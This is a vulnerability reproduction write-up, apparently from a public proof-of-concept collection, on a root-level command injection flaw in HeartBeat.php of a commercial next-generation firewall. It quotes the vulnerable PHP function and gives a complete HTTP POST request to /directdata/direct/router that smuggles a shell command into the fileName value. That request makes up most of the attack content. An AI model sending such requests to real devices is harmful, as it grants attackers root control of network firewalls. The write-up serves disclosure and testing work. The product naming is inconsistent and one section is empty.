#NetCon Next Generation Firewall HeartBeat.php Remote Command Execution Vulnerability

## Vulnerability Description

Netcom Next Generation Firewall HeartBeat.php file has a remote command execution vulnerability. The attacker can obtain the server's Root permissions by constructing a request package.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;"> Qi'anxin Netkang next-generation firewall</span>

## Network surveying and mapping



## Vulnerability reappears

The login page is as follows

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1649263762930-86ac1706-31bd-42c5-9b5f-822e695eac7b.png)

Files with vulnerability **applications/Models/NS/Rpc/HeartBeat.php**

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1649263844774-f32c96ef-f93e-463a-aeee-bb5f7a567718.png)

```php
public function delTestFile($fileName){
	    if(dirname($fileName) == '/var/www/tmp'){
		$cmd = "/bin/rm -f {$fileName}";
		putenv("CMD=$cmd");
		$msg = shell_exec('/var/www/html/scripts/exec_cmd');
	    }
	    return time();
	}
```

Call the method delTestFile, the fileName parameter is controllable, the exec_cmd file called is a Root permission file, and the request package is constructed for command execution

```php
POST /directdata/direct/router HTTP/1.1
Host: 
Connection: close
Content-Length: 179
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Content-Type: application/json
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9

{"action":"NS_Rpc_HeartBeat","method":"delTestFile","data": ["/var/www/tmp/1.txt;id>2.txt"],"type":"rpc","tid":11,"f8839p7rqtj":"="}
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1649264137977-dad6f7f8-adce-4189-856b-c564d8ba8a75.png)

Access to the written file

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1649264181844-e562d3ea-a6cd-469c-9c8b-3998deed5bc3.png)